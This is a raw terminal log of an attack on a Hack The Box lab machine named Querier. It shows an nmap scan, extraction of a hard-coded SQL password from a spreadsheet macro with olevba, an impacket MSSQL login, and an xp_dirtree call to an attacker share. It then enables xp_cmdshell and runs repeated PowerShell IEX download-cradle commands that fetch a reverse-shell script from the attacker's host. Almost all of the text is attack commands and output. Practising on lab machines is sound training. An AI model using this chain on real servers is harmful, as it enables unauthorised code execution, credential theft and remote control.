┌─[root@parrot]─[~]            
└──╼ #nmap -p- -oA nmap/allports  -vvv 10.10.10.125                                                                                                               
Failed to open normal output file nmap/allports.nmap for writing
QUITTING!                      
┌─[✗]─[root@parrot]─[~]        
└──╼ #cd hackthebox/querrier/  
┌─[root@parrot]─[~/hackthebox/querrier]                       
└──╼ #nmap -p- -oA nmap/allports  -vvv 10.10.10.125           
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 22:11 EST
Initiating Ping Scan at 22:11  
Scanning 10.10.10.125 [4 ports]                               
Completed Ping Scan at 22:11, 0.27s elapsed (1 total hosts)   
Initiating Parallel DNS resolution of 1 host. at 22:11        
Completed Parallel DNS resolution of 1 host. at 22:12, 11.03s elapsed
DNS resolution of 1 IPs took 11.03s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 5, CN: 0]                                                                 
Initiating SYN Stealth Scan at 22:12                          
Scanning 10.10.10.125 [65535 ports]                           
Discovered open port 139/tcp on 10.10.10.125                  
Discovered open port 445/tcp on 10.10.10.125                  
Discovered open port 135/tcp on 10.10.10.125                  
Increasing send delay for 10.10.10.125 from 0 to 5 due to 531 out of 1769 dropped probes since last increase.                                                     
SYN Stealth Scan Timing: About 7.05% done; ETC: 22:19 (0:06:49 remaining) 
SYN Stealth Scan Timing: About 9.04% done; ETC: 22:23 (0:10:14 remaining) 
SYN Stealth Scan Timing: About 10.47% done; ETC: 22:26 (0:12:58 remaining)
Discovered open port 49666/tcp on 10.10.10.125                
SYN Stealth Scan Timing: About 11.79% done; ETC: 22:29 (0:15:06 remaining)
SYN Stealth Scan Timing: About 12.54% done; ETC: 22:32 (0:17:33 remaining)
SYN Stealth Scan Timing: About 13.75% done; ETC: 22:34 (0:18:55 remaining)
SYN Stealth Scan Timing: About 17.08% done; ETC: 22:33 (0:17:48 remaining)
Discovered open port 49667/tcp on 10.10.10.125                
SYN Stealth Scan Timing: About 20.07% done; ETC: 22:32 (0:16:36 remaining)
SYN Stealth Scan Timing: About 23.13% done; ETC: 22:32 (0:15:31 remaining)
Discovered open port 49664/tcp on 10.10.10.125                
SYN Stealth Scan Timing: About 27.13% done; ETC: 22:31 (0:14:17 remaining)
SYN Stealth Scan Timing: About 30.75% done; ETC: 22:31 (0:13:13 remaining)
SYN Stealth Scan Timing: About 34.70% done; ETC: 22:30 (0:12:10 remaining)
SYN Stealth Scan Timing: About 38.59% done; ETC: 22:30 (0:11:05 remaining)
Discovered open port 49665/tcp on 10.10.10.125                
SYN Stealth Scan Timing: About 42.39% done; ETC: 22:29 (0:10:09 remaining)
Discovered open port 49668/tcp on 10.10.10.125                
SYN Stealth Scan Timing: About 46.80% done; ETC: 22:29 (0:09:03 remaining)
SYN Stealth Scan Timing: About 51.17% done; ETC: 22:28 (0:08:05 remaining)
Discovered open port 1433/tcp on 10.10.10.125                 
Discovered open port 49671/tcp on 10.10.10.125                
SYN Stealth Scan Timing: About 55.73% done; ETC: 22:28 (0:07:14 remaining)
SYN Stealth Scan Timing: About 60.56% done; ETC: 22:28 (0:06:22 remaining)           
Discovered open port 49669/tcp on 10.10.10.125                                       
SYN Stealth Scan Timing: About 65.05% done; ETC: 22:27 (0:05:33 remaining)           
Discovered open port 5985/tcp on 10.10.10.125                                        
SYN Stealth Scan Timing: About 69.75% done; ETC: 22:27 (0:04:45 remaining)           
Discovered open port 47001/tcp on 10.10.10.125                                       
SYN Stealth Scan Timing: About 75.02% done; ETC: 22:27 (0:03:53 remaining)           
SYN Stealth Scan Timing: About 79.80% done; ETC: 22:27 (0:03:06 remaining)           
SYN Stealth Scan Timing: About 85.02% done; ETC: 22:27 (0:02:16 remaining)           
SYN Stealth Scan Timing: About 90.12% done; ETC: 22:27 (0:01:30 remaining)           
Discovered open port 49670/tcp on 10.10.10.125                                       
SYN Stealth Scan Timing: About 95.39% done; ETC: 22:27 (0:00:42 remaining)           
Completed SYN Stealth Scan at 22:27, 926.16s elapsed (65535 total ports)             
Nmap scan report for 10.10.10.125         
Host is up, received echo-reply ttl 127 (0.18s latency).                             
Scanned at 2019-12-23 22:11:54 EST for 937s                                          
Not shown: 65521 closed ports             
Reason: 65521 resets 
PORT      STATE SERVICE      REASON       
135/tcp   open  msrpc        syn-ack ttl 127                                         
139/tcp   open  netbios-ssn  syn-ack ttl 127                                         
445/tcp   open  microsoft-ds syn-ack ttl 127                                         
1433/tcp  open  ms-sql-s     syn-ack ttl 127                                         
5985/tcp  open  wsman        syn-ack ttl 127                                         
47001/tcp open  winrm        syn-ack ttl 127                                         
49664/tcp open  unknown      syn-ack ttl 127                                         
49665/tcp open  unknown      syn-ack ttl 127                                         
49666/tcp open  unknown      syn-ack ttl 127                                         
49667/tcp open  unknown      syn-ack ttl 127                                         
49668/tcp open  unknown      syn-ack ttl 127                                         
49669/tcp open  unknown      syn-ack ttl 127                                         
49670/tcp open  unknown      syn-ack ttl 127                                         
49671/tcp open  unknown      syn-ack ttl 127                                         

Read data files from: /usr/bin/../share/nmap                                         
Nmap done: 1 IP address (1 host up) scanned in 937.62 seconds                        
           Raw packets sent: 73605 (3.239MB) | Rcvd: 67012 (2.696MB)                 
┌─[root@parrot]─[~/hackthebox/querrier]   
└──╼ #olevba         
olevba 0.51 - http://decalage.info/python/oletools                                   

olevba.py            

olevba is a script to parse OLE and OpenXML files such as MS Office documents        
(e.g. Word, Excel), to extract VBA Macro code in clear text, deobfuscate             
and analyze malicious macros.             

Supported formats:   
- Word 97-2003 (.doc, .dot), Word 2007+ (.docm, .dotm)                               
- Excel 97-2003 (.xls), Excel 2007+ (.xlsm, .xlsb)                                   
- PowerPoint 97-2003 (.ppt), PowerPoint 2007+ (.pptm, .ppsm)                         
- Word 2003 XML (.xml)                    
- Word/Excel Single File Web Page / MHTML (.mht)                                     
- Publisher (.pub)   

Author: Philippe Lagadec - http://www.decalage.info                                  
License: BSD, see source code or documentation                                       

olevba is part of the python-oletools package:                                       
http://www.decalage.info/python/oletools  

olevba is based on source code from officeparser by John William Davison             
https://github.com/unixfreak0037/officeparser                                        

Usage: olevba [options] <filename> [filename2 ...]                                   

Options:             
  -h, --help            show this help message and exit                              
  -r                    find files recursively in subdirectories.                    
  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD     
                        if the file is a zip archive, open all files from it,        
                        using the provided password (requires Python 2.6+)           
  -f ZIP_FNAME, --zipfname=ZIP_FNAME      
                        if the file is a zip archive, file(s) to be opened           
                        within the zip. Wildcards * and ? are supported.             
                        (default:*)       
  -a, --analysis        display only analysis results, not the macro source          
                        code              
  -c, --code            display only VBA source code, do not analyze it              
  --decode              display all the obfuscated strings with their decoded        
                        content (Hex, Base64, StrReverse, Dridex, VBA).              
  --attr                display the attribute lines at the beginning of VBA          
                        source code       
  --reveal              display the macro source code after replacing all the        
                        obfuscated strings by their decoded content.                 
  -l LOGLEVEL, --loglevel=LOGLEVEL        
                        logging level debug/info/warning/error/critical              
                        (default=warning) 
  --deobf               Attempt to deobfuscate VBA expressions (slow)                
  --relaxed             Do not raise errors if opening of substream fails            

  Output mode (mutually exclusive):       
    -t, --triage        triage mode, display results as a summary table              
                        (default for multiple files)                                 
    -d, --detailed      detailed mode, display full results (default for             
                        single file)      
    -j, --json          json mode, detailed in json format (never default)           
┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                          
└──╼ #ls             
nmap  smb            
┌─[root@parrot]─[~/hackthebox/querrier]   
└──╼ #cd nmap/       
┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                         
└──╼ #ls             
allports.gnmap  allports.xml  querier.gnmap  querier.xml    scripts.nmap             
allports.nmap   ports         querier.nmap   scripts.gnmap  scripts.xml              
┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                         
└──╼ #cd ..          
┌─[root@parrot]─[~/hackthebox/querrier]   
└──╼ #cd smb/        
┌─[root@parrot]─[~/hackthebox/querrier/smb]                                          
└──╼ #ls             
'Currency Volume Report.xlsm'             
┌─[root@parrot]─[~/hackthebox/querrier/smb]                                          
└──╼ #olevba "Currency Volume Report.xlsm"                                           
olevba 0.51 - http://decalage.info/python/oletools                                   
Flags        Filename                                                                
-----------  -----------------------------------------------------------------       
OpX:M-S-H--- Currency Volume Report.xlsm  
===============================================================================      
FILE: Currency Volume Report.xlsm         
Type: OpenXML        
-------------------------------------------------------------------------------      
VBA MACRO ThisWorkbook.cls                
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'                         
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -        

' macro to pull data for client volume reports                                       
'                    
' further testing required                

Private Sub Connect()                     

Dim conn As ADODB.Connection              
Dim rs As ADODB.Recordset                 

Set conn = New ADODB.Connection           
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"                             
conn.ConnectionTimeout = 10               
conn.Open            

If conn.State = adStateOpen Then          

  ' MsgBox "connection successful"        
                     
  'Set rs = conn.Execute("SELECT * @@version;")                                      
  Set rs = conn.Execute("SELECT * FROM volume;")                                     
  Sheets(1).Range("A1").CopyFromRecordset rs                                         
  rs.Close           

End If               

End Sub              
-------------------------------------------------------------------------------      
VBA MACRO Sheet1.cls                      
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'                               
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -        
(empty macro)        
+------------+-------------+-----------------------------------------+               
| Type       | Keyword     | Description                             |               
+------------+-------------+-----------------------------------------+               
| Suspicious | Open        | May open a file                         |               
| Suspicious | Hex Strings | Hex-encoded strings were detected, may  |               
|            |             | be used to obfuscate strings (option    |               
|            |             | --decode to see all)                    |               
+------------+-------------+-----------------------------------------+               

┌─[root@parrot]─[~/hackthebox/querrier/smb]                                          
└──╼ #locate mssqlclient                  
/opt/impacket/examples/mssqlclient.py                                                
/usr/local/bin/mssqlclient.py             
/usr/local/bin/mssqlclient.pyc            
/usr/share/doc/python3-impacket/examples/mssqlclient.py                              
┌─[root@parrot]─[~/hackthebox/querrier/smb]                                          
└──╼ #mssqlclient.py reporting@10.10.10.125 -windows-auth                            
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                         

Password:            
[*] Encryption required, switching to TLS 
[-] ERROR(QUERIER): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.                                
┌─[root@parrot]─[~/hackthebox/querrier/smb]                                          
└──╼ #mssqlclient.py reporting@10.10.10.125 -windows-auth                            
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                         

Password:            
[*] Encryption required, switching to TLS 
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume                        
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english                      
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                         
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.                     
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.                   
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)                                 
[!] Press help for extra shell commands   
SQL>                                    
SQL> help                               

     lcd {path}                 - changes the current local directory to {path}  
     exit                       - terminates the server process (and this session)                                                                                
     enable_xp_cmdshell         - you know what it means                         
     disable_xp_cmdshell        - you know what it means                         
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell                 
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)                                                                                 
     ! {cmd}                    - executes a local shell cmd                     
                                        
SQL> xp_dirtree "\\10.10.14.11\arrow\"  
subdirectory                                                                                                                                                                                                                                                            depth                                                       

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------                                                       

SQL> exit                               
┌─[root@parrot]─[~/hackthebox/querrier/smb]                                      
└──╼ #mssqlclient.py reporting@10.10.10.125 -windows-auth                        
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                     

Password:                               
[1]+  Stopped                 mssqlclient.py reporting@10.10.10.125 -windows-auth                                                                                 
┌─[✗]─[root@parrot]─[~/hackthebox/querrier/smb]                                  
└──╼ #mssqlclient.py mssql-svc@10.10.10.125 -windows-auth                                                                                                         
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                     

Password:                               
[*] Encryption required, switching to TLS                                        
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                    
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english                  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                     
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.                 
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.               
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)                             
[!] Press help for extra shell commands 
SQL> whoamin                            
[-] ERROR(QUERIER): Line 1: Could not find stored procedure 'whoamin'.           
SQL> help                               

     lcd {path}                 - changes the current local directory to {path}  
     exit                       - terminates the server process (and this session)                                                                                
     enable_xp_cmdshell         - you know what it means                         
     disable_xp_cmdshell        - you know what it means                         
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell                 
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)                                                                                 
     ! {cmd}                    - executes a local shell cmd                     
                                        
SQL> enable_xp_cmdshell                 
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                          
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.                                    
SQL> whoami                             
[-] ERROR(QUERIER): Line 1: Could not find stored procedure 'whoami'.            
SQL> xp_cmdshell whoami                 
output                                                                                                                                                            

--------------------------------------------------------------------------------                                                                                  

querier\mssql-svc                                                                                                                                                 

NULL                                                                                                                                                              

SQL> xp_cmdshell powershell IEX(New-Object Web.Client).downloadString('http://10.10.14.11:4444/reverse.ps1')                                                      
[-] ERROR(QUERIER): Line 1: Incorrect syntax near '/'.                           
SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:4444/reverse.ps1')                                                   
[-] ERROR(QUERIER): Line 1: Incorrect syntax near '/'.                           
SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.11:4444/reverse.ps1\')                                                 
[-] ERROR(QUERIER): Line 1: Incorrect syntax near '/'.                           
SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.11:4444/reverse.ps1\")                                                 
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.                
SQL> enable_xp_cmdshell                                                                                                                                           
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                          
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.                                    
SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.11:4444/reverse.ps1\")                                                 
output                                                                                                                                                            

--------------------------------------------------------------------------------                                                                                  

NULL                                                                                                                                                              

SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.11:4444/reverse.ps1\")                                                 
                                        
exit                                    
^Z                                      
[2]+  Stopped                 mssqlclient.py mssql-svc@10.10.10.125 -windows-auth                                                                                 
┌─[✗]─[root@parrot]─[~/hackthebox/querrier/smb]                                  
└──╼ #mssqlclient.py mssql-svc@10.10.10.125 -windows-auth                        
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                     

Password:                               
[*] Encryption required, switching to TLS                                        
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                    
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english                  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                     
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.                 
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.               
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)                             
[!] Press help for extra shell commands 
SQL> help                               

     lcd {path}                 - changes the current local directory to {path}  
     exit                       - terminates the server process (and this session)                                                                                
     enable_xp_cmdshell         - you know what it means                         
     disable_xp_cmdshell        - you know what it means                         
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell                 
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)                                                                                 
     ! {cmd}                    - executes a local shell cmd                     
                                        
SQL> enable_xp_cmdshell                 
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                          
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.                                    
SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.11:8000/reverse.ps1\")                                                 
^Z                                      
[3]+  Stopped                 mssqlclient.py mssql-svc@10.10.10.125 -windows-auth                                                                                 
┌─[✗]─[root@parrot]─[~/hackthebox/querrier/smb]                                  
└──╼ #mssqlclient.py mssql-svc@10.10.10.125 -windows-auth                        
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                     

Password:                               
[*] Encryption required, switching to TLS                                        
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                    
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english                  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                     
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.                 
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.               
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)                             
[!] Press help for extra shell commands 
SQL> exit           
┌─[root@parrot]─[~/hackthebox/querrier/smb]                                      
└──╼ #mssqlclient.py mssql-svc@10.10.10.125 -windows-auth                        
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                     

Password:           
[*] Encryption required, switching to TLS                                        
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                    
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english                  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192                     
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.                 
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.               
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)                             
[!] Press help for extra shell commands 
SQL> enable_xp_cmdshell                 
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                          
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.                                    
SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.11:8000/reverse.ps1\")                                                 
output                                                                                                                                                            

--------------------------------------------------------------------------------                                                                                  

Exception calling "DownloadString" with "1" argument(s): "Unable to connect to the remote server"                                                                 

At line:1 char:1                                                                                                                                                  

+ IEX(New-Object Net.WebClient).downloadString("http://10.10.14.11:8000 ...                                                                                       

+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                           

    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException                                                                                     

    + FullyQualifiedErrorId : WebException                                                                                                                        

                                                                                                                                                                  

NULL                                                                                                                                                              

SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.11:4444/reverse.ps1\")                                                 
^Z                                      
[4]+  Stopped                 mssqlclient.py mssql-svc@10.10.10.125 -windows-auth                                                                                 
┌─[✗]─[root@parrot]─[~/hackthebox/querrier/smb]                                  
└──╼ #                                  
